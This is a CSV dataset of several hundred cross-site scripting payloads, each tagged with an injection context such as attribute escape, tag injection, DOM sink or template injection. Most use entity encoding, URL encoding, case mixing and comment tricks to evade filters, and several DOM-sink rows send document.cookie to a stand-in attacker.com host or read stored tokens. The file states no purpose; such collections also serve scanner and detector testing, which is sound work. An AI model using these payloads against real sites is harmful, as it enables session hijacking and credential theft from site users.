payload,context
""" ><svg onanimationiteration=confirm(String.fromCharCode(88,83,83))>",attribute_escape
<script>consol&#101;.log`1`</script>,script_injection
<!--><xss ontoggle=console.log('XSS')>,tag_injection
%3Ctemplate/onreset=alert(location.hash)%3E,tag_injection
onk&#101;ypr&#101;ss=consol&#101;.log(loc&#97;tion.h&#97;sh),event_handler
&quot; onerror=console.log(location.hash) x=&quot;,attribute_escape
<script>/x/confirm(docum&#101;nt.dom&#97;in)</script>,script_injection
"""><img src=x onpromptdismiss=prompt(loc&#97;tion.h&#97;sh)>",attribute_escape
\' ongotpointercapture=prompt('XSS')//,attribute_escape
<base src=x ongestureend=console.log(document.domain)>,tag_injection
'><img src=x onch&#97;ng&#101;=consol&#101;.log(1)>,attribute_escape
onmouseup=confirm/**/(document.domain),event_handler
"%3Cdiv src=x onwebkitfullscreenchange=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
"Obj&#101;ct.&#97;ssign(window,{""onp&#97;g&#101;sw&#97;p"":&#101;v&#97;l})",dom_sink
"""%3E%3Cscript%3Econsole.log(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
"'%3E%3Cimg src=x oncanplay=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
' ><svg onmous&#101;wh&#101;&#101;l=&#97;l&#101;rt(1)>,attribute_escape
<boDy OnbEfoRecUt=ConFirM(dOcuMenT.dOmaIn)/>,tag_injection
'><Img srC=x onTouChsTarT=cOnsOle.loG(1)>,attribute_escape
' ><svG oNblUr=ConSolE.lOg(DocUmeNt.DomAin)>,attribute_escape
%3Cimg	onkeypress=console.log(1)%3E,tag_injection
"OnpRomPtdIsmIss=coNsoLe.Log/**/(STriNg.FroMChArCOde(88,83,83))",event_handler
"`><img src=x onmozfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
\' OnpAgeShoW=cOnsOle.loG(lOcaTioN.hAsh)//,attribute_escape
" onpagereveal=confirm(String.fromCharCode(88,83,83))",event_handler
'><Img srC=x onPasTe=ConSolE.lOg(1)>,attribute_escape
%22 ><svg onselect=prompt(1)>,attribute_escape
OnmOusEenTer=jaVasCriPt:ProMpt(doCumEnt.doMaiN),event_handler
"<&#97;
ons&#101;&#97;rch=&#97;l&#101;rt(1)>",tag_injection
%22 onpopstate=alert(%27XSS%27) %22,attribute_escape
' onclick=prompt('XSS') ',attribute_escape
' onsearch=\u0061lert('XSS') ',attribute_escape
\%27 onpointerover=confirm(location.hash)//,attribute_escape
%3Canimatemotion onanimationiteration=console.log('XSS')/%3E,tag_injection
onanimationstart=\u0061lert('XSS'),event_handler
"Object.assign(window,{""onselect"":\u0061lert})",dom_sink
' ><svg onk&#101;ypr&#101;ss=&#97;l&#101;rt('XSS')>,attribute_escape
onbeforepaste=javascript:console.log(location.hash),event_handler
'><img src=x onended=console.log(document.domain)>,attribute_escape
"""><m&#97;th onpl&#97;ying=consol&#101;.log('XSS')>",tag_injection
"(new Function(""prompt(1)""))();",dom_sink
{{constructor[%27constructor%27](%27alert(document.cookie)%27)()}},template_injection
"window[""confirm""](n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink
'><img src=x onfocusin=consol&#101;.log(loc&#97;tion.h&#97;sh)>,attribute_escape
""" ><svG oNtoGglE=cOnsOle.loG('XSS')>",attribute_escape
<td onsubmit=confirm(docum&#101;nt.dom&#97;in)/>,tag_injection
<auDio srC=x onPauSe=ConSolE.lOg(DocUmeNt.DomAin)>,tag_injection
j&#97;vascript:console.log(location.hash),js_uri
"__proto__[""ongesturestart""]=\u0061lert(localStorage.getItem('token'))",dom_sink
OnwEbkIttRanSitIonEnd=alErt/***/(LocAtiOn.HasH),event_handler
&quOt; onSelEct=prOmpT(1) x=&qUot;,attribute_escape
""" ><svG oNpoIntErmOve=coNfiRm(DocUmeNt.DomAin)>",attribute_escape
"onclick=javascript:confirm(String.fromCharCode(88,83,83))",event_handler
<m&#97;th/onpl&#97;ying=consol&#101;.log('XSS')>,tag_injection
%3Cobject	onwebkitanimationend=alert(location.hash)%3E,tag_injection
<% alert('XSS') %>,template_injection
document.body.innerHTML=%22<img src=x onerror=fetch(localStorage.getItem(%27token%27))>%22,dom_sink
"ObjEct.asSigN(wIndOw,{""oNbeForEcuT"":EvaL})",dom_sink
"(new Function(""XMLHttpRequest(document.cookie)""))();",dom_sink
"<script>setTimeout(%27console.log(document.domain)%27,0)</script>",script_injection
"`><img src=x on&#97;nim&#97;tion&#101;nd=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"location.href=""javascr	ipt:eval(document.cookie+'&loc='+location.href)""",dom_sink
"document.querySelector(""body"").innerHTML+=""confirm(navigator.sendBeacon('//attacker.com',document.cookie))""",dom_sink
"j&#97;vascript:alert(String.fromCharCode(88,83,83))",js_uri
\%22 onerror=console.log(document.domain)//,attribute_escape
"__proto__[""onpointermove""]=fetch(document.cookie)",dom_sink
"<foRm Src=x OnwEbkItfUllScrEenChaNge=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
' %3E%3Csvg onsearch=confirm(1)%3E,attribute_escape
`%3E%3Cimg src=x onmouseover=prompt(1)%3E,attribute_escape
<!--><noscript ongesturestart=\u0061lert('XSS')>,tag_injection
%3Cform onwaiting=confirm(1)%3E,tag_injection
"JavAscRipT:/*-/*`/*\`/*'/*""/**/(/* */oNCliCk=ProMpt(loCatIon.haSh) )//%0D%0A%0D%0A",js_uri
%3C!--%3E%3Cmarquee onauxclick=prompt(location.hash)%3E,tag_injection
'><img src=x oninvalid=confirm(1)>,attribute_escape
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""XMLHttpR&#101;qu&#101;st(1)""",dom_sink
<textarea onscrollend=\u0061lert('XSS')>,tag_injection
"<sourc&#101; onvolum&#101;ch&#97;ng&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) onvolum&#101;ch&#97;ng&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
onpointermove=javascript:confirm('XSS'),event_handler
'><Img srC=x onEnd=coNfiRm('XSS')>,attribute_escape
"""><img src=x ongesturestart=\u0061lert(location.hash)>",attribute_escape
"setTimeout(%22fetch(navigator.sendBeacon(%27//attacker.com%27,document.cookie))%22,0)",dom_sink
"""><form onr&#101;s&#101;t=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
 onscrollsn&#97;pch&#97;ng&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler
__proto__[%22onmousedown%22]=eval(%27//attacker.com/?c=%27+document.cookie),dom_sink
""" oNdrAgeNteR=cOnfIrm('XSS') """,attribute_escape
"""%3E%3Cimg src=x onended=prompt('XSS')%3E",attribute_escape
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:prompt(1)""",dom_sink
{{&#97;l&#101;rt(docum&#101;nt.cooki&#101;)}},template_injection
""" oNmoUseDowN=cOnfIrm(1) """,attribute_escape
&quot; ontoggl&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) x=&quot;,attribute_escape
"' oNbeForEpaSte=prOmpT(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape
<%= alert %27XSS%27 %>,template_injection
"""><Img srC=x onInvAliD=cOnfIrm(1)>",attribute_escape
"EleMenT.iNseRtADjaCenTHTML(""beForEenD"",""<iMg Src=x OneRroR=fEtcH(lOcaTioN.hAsh)>"")",dom_sink
"Object.assign(window,{""onmouseup"":confirm})",dom_sink
<spAn Src=x OncOpy=prOmpT(lOcaTioN.hAsh)>,tag_injection
"<meTa/OnhAshChaNge=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
"<object
onsubmit=confirm(location.hash)>",tag_injection
"onpoint&#101;rov&#101;r=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
%3Cvideo src=x onclick=console.log('XSS')%3E,tag_injection
%22 ondragenter=confirm(%27XSS%27) %22,attribute_escape
<% AleRt('XSS') %>,template_injection
%22 ><svg ontouchend=confirm(%27XSS%27)>,attribute_escape
`%3E%3Cimg src=x onanimationend=confirm(document.domain)%3E,attribute_escape
&quOt; onTogGle=coNfiRm('XSS') x=&quOt;,attribute_escape
onblur=consol&#101;.log/***/(docum&#101;nt.dom&#97;in),event_handler
<% ProMpt(doCumEnt.coOkiE) %>,template_injection
%3Cscript%3Econfirm`1`%3C/script%3E,script_injection
\' ongestureend=prompt('XSS')//,attribute_escape
JAVASCRIPT:prompt(location.hash),js_uri
""" %3E%3Csvg oncanplay=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape
"%3Csource onvolumechange=confirm(String.fromCharCode(88,83,83)) onvolumechange=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
OnpOinTerRawUpdAte=coNsoLe.Log&#40;lOcaTioN.hAsh&#41;,event_handler
"WinDow[""cOnsOle.loG""](naVigAtoR.sEndBeaCon('//atTacKer.coM',DocUmeNt.CooKie))",dom_sink
"<viDeo
onCliCk=ConSolE.lOg('XSS')>",tag_injection
"SetTimEouT(""EvaL(dOcuMenT.cOokIe)"",0)",dom_sink
ondrop=javascr	ipt:console.log(document.domain),event_handler
OnmOusEenTer=coNfiRm/***/(lOcaTioN.hAsh),event_handler
""" onpointerrawupdate=alert('XSS') """,attribute_escape
'><img src=x oncanplay=prompt(document.domain)>,attribute_escape
"""><img src=x ontr&#97;nsitionrun=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
<animatemotion onwaiting=\u0061lert(location.hash)>,tag_injection
	onFocUsoUt=ConFirM(lOcaTioN.hAsh),event_handler
"ontr&#97;nsitionst&#97;rt=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"""><pl&#97;int&#101;xt onp&#97;g&#101;r&#101;v&#101;&#97;l=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
'><img src=x onmouseup=prompt(document.domain)>,attribute_escape
%27 ongestureend=prompt(document.domain) %27,attribute_escape
%3Canimatetransform x=y oncontextmenu=prompt(document.domain)%3E,tag_injection
 on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(docum&#101;nt.dom&#97;in),event_handler
"j&#97;v&#97;
script:&#97;l&#101;rt(loc&#97;tion.h&#97;sh)",js_uri
{{{alert(1)}}},template_injection
"'><Img srC=x onRepEat=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
<&#97;udio onp&#97;us&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in) onp&#97;us&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
""" ><svg onvolumechange=\u0061lert(document.domain)>",attribute_escape
"element.setAttribute(""onclick"",""alert(location.hash)"")",dom_sink
j&#97;v&#97;	script:prompt(loc&#97;tion.h&#97;sh),js_uri
%27 onmouseenter=alert(location.hash) %27,attribute_escape
&quOt; onMouSewHeeL=aLerT(lOcaTioN.hAsh) x=&qUot;,attribute_escape
"\"" onend=prompt(location.hash)//",attribute_escape
"(n&#101;w Function(""prompt(loc&#97;tion.h&#97;sh)""))();",dom_sink
&quot; onreset=console.log(%27XSS%27) x=&quot;,attribute_escape
'><img src=x onwaiting=confirm(document.domain)>,attribute_escape
"java
scr	ipt:confirm(1)",js_uri
"&quOt; onErrOr=ConFirM(STriNg.FroMChArCOde(88,83,83)) X=&QuoT;",attribute_escape
"document.body.innerHTML=""<img src=x onerror=\u0061lert(navigator.sendBeacon('//attacker.com',document.cookie))>""",dom_sink
"__proto__[""onended""]=XMLHttpRequest(location.hash)",dom_sink
'><Img srC=x onPoiNteRup=alErt(1)>,attribute_escape
"""><Img srC=x onTogGle=prOmpT(1)>",attribute_escape
<s&#101;l&#101;ct onmous&#101;wh&#101;&#101;l=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection
"Obj&#101;ct.&#97;ssign(window,{""ontr&#97;nsition&#101;nd"":&#97;l&#101;rt})",dom_sink
\%27 ongestureend=alert(1)//,attribute_escape
"' oncut=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
"\"" OnsEcuRitYpoLicYviOlaTioN=pRomPt(1)//",attribute_escape
onclick=javascript:confirm(1),event_handler
<!--><mtext onended=confirm(document.domain)>,tag_injection
"<blink	onpagehide=confirm(String.fromCharCode(88,83,83))>",tag_injection
<!--><mtext onstalled=console.log(document.domain)>,tag_injection
"OnpRomPtaCtiOn=ConFirM&#40;StrIng.frOmCHarCodE(88,83,83)&#41;",event_handler
<tr	onanimationend=prompt('XSS')>,tag_injection
JavAscRipT:cOnsOle.loG/**/(1),js_uri
j&#97;v&#97;script:prompt/*x*/('XSS'),js_uri
__proto__[%22onfocusout%22]=prompt(document.cookie+%27&loc=%27+location.href),dom_sink
" onTraNsiTioNstArt=prOmpT(STriNg.FroMChArCOde(88,83,83))",event_handler
"' ><svG oNpoIntEroVer=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
<script onkeydown=confirm(document.domain)>,tag_injection
<&#97;nim&#97;t&#101;motion onw&#97;iting=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) onw&#97;iting=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
	onhashchange=confirm('XSS'),event_handler
<scRipT	>ConSolE.lOg(DocUmeNt.DomAin)</ScrIpt>,script_injection
"\%27 onstalled=console.log(String.fromCharCode(88,83,83))//",attribute_escape
OnpAgeShoW=pRomPt&#40;1&#41;,event_handler
""" ><svg onp&#97;g&#101;hid&#101;=prompt(docum&#101;nt.dom&#97;in)>",attribute_escape
'%3E%3Cimg src=x onanimationiteration=console.log('XSS')%3E,attribute_escape
"__proto__[""onp&#97;g&#101;sw&#97;p""]=prompt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)",dom_sink
onend=prompt(1),event_handler
 onbeforeinput=prompt(document.domain),event_handler
onmozfullscreenchange=javascr	ipt:prompt('XSS'),event_handler
%3C!--%3E%3Cxss onkeypress=console.log(1)%3E,tag_injection
""" ><svG oNdrAgeNteR=cOnfIrm('XSS')>",attribute_escape
"""%3E%3Cnoscript ongesturestart=alert('XSS')%3E",tag_injection
"onfocus=j&#97;v&#97;script:prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
 onTouChmOve=coNfiRm(LocAtiOn.HasH),event_handler
<SCRIPT>\u0061lert(document.domain)</SCRIPT>,script_injection
"ObjEct.asSigN(wIndOw,{""oNplAy"":feTch})",dom_sink
"&quot; onclos&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape
"onsubmit=confirm/***/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"""><s&#101;t onpoint&#101;rmov&#101;=confirm(loc&#97;tion.h&#97;sh)>",tag_injection
onwheel=javascr	ipt:prompt(1),event_handler
""" onmouseover=console.log(document.domain) x=""",attribute_escape
location.href=%22javascript:confirm(%27XSS%27)%22,dom_sink
"""><Img srC=x onPoiNteRcaNceL=pRomPt(1)>",attribute_escape
"\"" onpointerover=console.log(String.fromCharCode(88,83,83))//",attribute_escape
"element.setAttribute(%22onclick%22,%22console.log(1)%22)",dom_sink
\' onclick=confirm('XSS')//,attribute_escape
' %3E%3Csvg onpause=confirm('XSS')%3E,attribute_escape
' ><svG oNfoCusOut=coNfiRm(LocAtiOn.HasH)>,attribute_escape
<animatetransform onpointerdown=prompt(1)/>,tag_injection
'><img src=x onerror=confirm(location.hash)>,attribute_escape
"LocAtiOn.HreF=""JavAscRipT:pRomPt(StrIng.frOmCHarCodE(88,83,83))""",dom_sink
{{{prompt(docum&#101;nt.dom&#97;in)}}},template_injection
"<template src=x onbegin=alert(String.fromCharCode(88,83,83))>",tag_injection
OnpOinTerUp=AleRt/**/(doCumEnt.doMaiN),event_handler
%3Cscript	%3Econsole.log('XSS')%3C/script%3E,script_injection
"__proto__[""ondblclick""]=\u0061lert(navigator.sendBeacon('//attacker.com',document.cookie))",dom_sink
"Obj&#101;ct.&#97;ssign(window,{""onp&#97;us&#101;"":prompt})",dom_sink
"document.body.innerHTML=""%3Cimg src=x onerror=alert(String.fromCharCode(88,83,83))%3E""",dom_sink
""" on&#101;nd=consol&#101;.log('XSS') """,attribute_escape
oninput=prompt/**/(location.hash),event_handler
`><Img srC=x onVolUmeChaNge=alErt(doCumEnt.doMaiN)>,attribute_escape
"	onfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
%22 ><svg ondragstart=confirm(1)>,attribute_escape
"%3Cbody
onbeforecut=confirm(document.domain)%3E",tag_injection
%27><img src=x onauxclick=console.log(1)>,attribute_escape
<maTh	OnsCroLleNd=ProMpt(doCumEnt.doMaiN)>,tag_injection
"${{'coNfiRm(DocUmeNt.DomAin)'.RepLacE('ConFirM(dOcuMenT.dOmaIn)','')}}",template_injection
%3Cplaintext	onrepeat=prompt('XSS')%3E,tag_injection
"Object.assign(window,{""onpointercancel"":console.log})",dom_sink
%3Cembed onmozfullscreenchange=confirm(location.hash)/%3E,tag_injection
\%27 oncontextmenu=alert(document.domain)//,attribute_escape
onpaste=javascript:alert(1),event_handler
<foRm Src=x OngEstUreStaRt=ConSolE.lOg('XSS')>,tag_injection
<xsS sRc=X oNkeYprEss=coNsoLe.Log(1)>,tag_injection
"(new Function(""prompt(document.domain)""))();",dom_sink
' oNtoUchEnd=prOmpT('XSS') ',attribute_escape
%22><link onwaiting=confirm(1)>,tag_injection
<!--><button ondragenter=alert(location.hash)>,tag_injection
'><img src=x onpointermove=\u0061lert(document.domain)>,attribute_escape
#seT($X='ProMpt('XSS')')$x,template_injection
""" %3E%3Csvg onbeforetoggle=alert(String.fromCharCode(88,83,83))%3E",attribute_escape
"<math
onplaying=console.log(%27XSS%27)>",tag_injection
`><img src=x onmousewheel=prompt(%27XSS%27)>,attribute_escape
"<boDy OngEstUreStaRt=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83)) onGesTurEstArt=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
"""><Img srC=x onPauSe=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
""" onfocus=prompt(docum&#101;nt.dom&#97;in) &#97;utofocus=""",attribute_escape
&quot; ondragenter=confirm('XSS') x=&quot;,attribute_escape
location=%22javascript:prompt(%27//attacker.com/?c=%27+document.cookie)%22,dom_sink
%22 onwheel=console.log(document.domain) %22,attribute_escape
<noscript ong&#101;stur&#101;st&#97;rt=&#97;l&#101;rt('XSS')>,tag_injection
onwebkitfullscreenchange=alert&#40;document.domain&#41;,event_handler
%27 ><svg onplay=confirm(%27XSS%27)>,attribute_escape
<plaintext	ontouchstart=\u0061lert(1)>,tag_injection
"%27 ><svg onbeforepaste=prompt(String.fromCharCode(88,83,83))>",attribute_escape
OngOtpOinTerCapTurE=pRomPt(LocAtiOn.HasH),event_handler
%3Canimatemotion onsecuritypolicyviolation=console.log('XSS') onsecuritypolicyviolation=console.log('XSS')%3E,tag_injection
onwaiting=javascript:confirm(document.domain),event_handler
"onrepeat=javascript:\u0061lert(String.fromCharCode(88,83,83))",event_handler
\%27 onhashchange=console.log(document.domain)//,attribute_escape
"""><tr ontoggl&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
"\"" OnwAitIng=prOmpT(dOcuMenT.dOmaIn)//",attribute_escape
""" ><svG oNscRolLsnApcHanGe=ConFirM('XSS')>",attribute_escape
""" onvolumechange=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape
"<base
onkeydown=alert('XSS')>",tag_injection
"setTimeout(%22eval(navigator.sendBeacon(%27//attacker.com%27,document.cookie))%22,0)",dom_sink
&quot; ondrop=confirm(location.hash) x=&quot;,attribute_escape
"onbeforetoggle=javascr	ipt:confirm(String.fromCharCode(88,83,83))",event_handler
<&#97;/onb&#101;for&#101;m&#97;tch=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
"\"" onb&#101;for&#101;p&#97;st&#101;=consol&#101;.log('XSS')//",attribute_escape
%3Cplaintext/onrepeat=prompt('XSS')%3E,tag_injection
"onwebkitanimationend=javascr	ipt:prompt(String.fromCharCode(88,83,83))",event_handler
"""><img src=x ongesturestart=\u0061lert(1)>",attribute_escape
"%3Cxmp onfocusout=prompt(String.fromCharCode(88,83,83)) onfocusout=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
"onb&#101;gin=confirm/**/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"setTimeout(""alert(btoa(document.cookie))"",0)",dom_sink
`%3E%3Cimg src=x oninput=confirm(1)%3E,attribute_escape
<!--><TexTarEa OnsCroLleNd=AleRt('XSS')>,tag_injection
""" ><svg ong&#101;stur&#101;&#101;nd=prompt('XSS')>",attribute_escape
"<noScrIpt x=Y oNbeForEmaTch=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
\%22 onscrollsnapchange=console.log(1)//,attribute_escape
"javascript:/*-/*`/*\`/*%27/*%22/**/(/* */oNcliCk=prompt(String.fromCharCode(88,83,83)) )//%0D%0A%0d%0a",js_uri
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:f&#101;tch(1)""",dom_sink
`><img src=x onpagehide=\u0061lert(location.hash)>,attribute_escape
<noscr	ipt	ongesturestart=alert('XSS')>,tag_injection
document.write(%22<img src=x onerror=eval(document.domain)>%22),dom_sink
"\"" OnmOusEwhEel=alErt(1)//",attribute_escape
""" onblur=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) """,attribute_escape
"Object.assign(window,{""onerror"":\u0061lert})",dom_sink
&quot; ongotpointercapture=console.log(%27XSS%27) x=&quot;,attribute_escape
"Object.assign(window,{%22onanimationcancel%22:XMLHttpRequest})",dom_sink
"%3Cscript%3E/*/confirm(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
<select ongotpointercapture=confirm(document.domain)/>,tag_injection
<liNk Src=x OniNpuT=aLerT(dOcuMenT.dOmaIn)>,tag_injection
JavAscRipT:pRomPt/***/('XSS'),js_uri
"j&#97;v&#97;script:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) )//%0D%0A%0d%0&#97;",js_uri
"j&#97;v&#97;script:void(confirm(String.fromCh&#97;rCod&#101;(88,83,83)))",js_uri
<tr x=y onanimationend=prompt('XSS')>,tag_injection
"\"" OncLosE=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))//",attribute_escape
\%22 ongesturestart=alert(1)//,attribute_escape
"OnpAgeShoW=jAvaScrIpt:prOmpT(STriNg.FroMChArCOde(88,83,83))",event_handler
onc&#97;npl&#97;y=consol&#101;.log&#40;'XSS'&#41;,event_handler
"""><MteXt OnmOusEdoWn=ConSolE.lOg(1)>",tag_injection
OnhAshChaNge=coNsoLe.Log/***/(LocAtiOn.HasH),event_handler
%27 ><svg onanimationiteration=confirm(%27XSS%27)>,attribute_escape
"' oNprOmpTdiSmiSs=ProMpt(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape
"""><img src=x oncopy=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape
<&#97;	onmozfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
<&#97;udio onmous&#101;ov&#101;r=consol&#101;.log('XSS')/>,tag_injection
%22 onbeforepaste=confirm(document.domain) %22,attribute_escape
%22 ><svg onfullscreenchange=alert(location.hash)>,attribute_escape
javascript:console.log/*x*/(%27XSS%27),js_uri
<button onclick=consol&#101;.log(1)/>,tag_injection
`><Img srC=x onAniMatIonCanCel=prOmpT(lOcaTioN.hAsh)>,attribute_escape
'%3E%3Cimg src=x onscrollsnapchange=alert(1)%3E,attribute_escape
"window[""&#101;v&#97;l""](loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink
"%3Cnoscript src=x onbeforematch=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
"__proto__[""onmousedown""]=\u0061lert(1)",dom_sink
"""><&#97;nim&#97;t&#101;tr&#97;nsform onpoint&#101;rdown=prompt(1)>",tag_injection
' onanimationiteration=console.log(document.domain) ',attribute_escape
<d&#101;t&#97;ils/onr&#101;p&#101;&#97;t=prompt(1)>,tag_injection
'%3E%3Cimg src=x onclick=prompt('XSS')%3E,attribute_escape
"__proto__[""on&#97;nim&#97;tionst&#97;rt""]=XMLHttpR&#101;qu&#101;st(String.fromCh&#97;rCod&#101;(88,83,83))",dom_sink
'><img src=x onpointercancel=prompt(1)>,attribute_escape
%3Cscript%3E//console.log(location.hash)%3C/script%3E,script_injection
"""%3E%3Cvideo onclick=console.log('XSS')%3E",tag_injection
<template onreset=alert(location.hash)/>,tag_injection
""" oNgoTpoIntErcAptUre=prOmpT('XSS') """,attribute_escape
<script>Function(%27alert(location.hash)%27)();</script>,script_injection
""" oNpoPstAte=prOmpT(1) """,attribute_escape
"__pRotO__[""oNmoUseEntEr""]=cOnfIrm(doCumEnt.coOkiE)",dom_sink
"OnbEgiN=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))",event_handler
"""><img src=x onkeypress=\u0061lert('XSS')>",attribute_escape
"&quot; onpaste=confirm(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape
<s&#101;t on&#101;nd=&#97;l&#101;rt(1)>,tag_injection
"&quot; onpl&#97;ying=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape
"\"" onblur=\u0061lert(location.hash)//",attribute_escape
%27 ><svg onpointerup=alert(1)>,attribute_escape
document.body.innerHTML=%22<img src=x onerror=prompt(1)>%22,dom_sink
"onmouseenter=\u0061lert&#40;String.fromCharCode(88,83,83)&#41;",event_handler
&quot; ondr&#97;g&#101;nt&#101;r=confirm('XSS') x=&quot;,attribute_escape
"<emBed
onMozFulLscReeNchAngE=cOnsOle.loG(dOcuMenT.dOmaIn)>",tag_injection
%22 onfocus=alert(location.hash) autofocus=%22,attribute_escape
"\"" OnaNimAtiOncAncEl=ConFirM(lOcaTioN.hAsh)//",attribute_escape
"__proto__[""onbeforetoggle""]=XMLHttpRequest(document.domain)",dom_sink
`%3E%3Cimg src=x ontransitionend=prompt(location.hash)%3E,attribute_escape
' oNcoNteXtmEnu=alErt(1) ',attribute_escape
"ObjEct.asSigN(wIndOw,{""oNtoUchStaRt"":prOmpT})",dom_sink
<!--><animate onpageshow=console.log(%27XSS%27)>,tag_injection
"OnpRomPtaCtiOn=ConFirM(STriNg.FroMChArCOde(88,83,83))",event_handler
"Object.assign(window,{%22onstalled%22:XMLHttpRequest})",dom_sink
<!--><Td OneNd=ConSolE.lOg(DocUmeNt.DomAin)>,tag_injection
	onpointercancel=prompt(location.hash),event_handler
&quot; on&#97;uxclick=confirm(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape
%3Cmeta onpointerover=confirm(1) onpointerover=confirm(1)%3E,tag_injection
 ontouchmov&#101;=prompt(docum&#101;nt.dom&#97;in),event_handler
<object onvolumechange=\u0061lert(1)/>,tag_injection
"__proto__[""onmous&#101;down""]=&#97;l&#101;rt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)",dom_sink
{{confirm(docum&#101;nt.dom&#97;in)}},template_injection
%22 onpointerrawupdate=alert(%27XSS%27) %22,attribute_escape
"Object.assign(window,{""onsubmit"":\u0061lert})",dom_sink
""" ><svg onh&#97;shch&#97;ng&#101;=confirm(docum&#101;nt.dom&#97;in)>",attribute_escape
